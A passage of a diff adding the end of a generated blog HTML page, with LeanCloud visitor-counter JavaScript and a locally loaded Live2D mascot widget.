+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nico.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
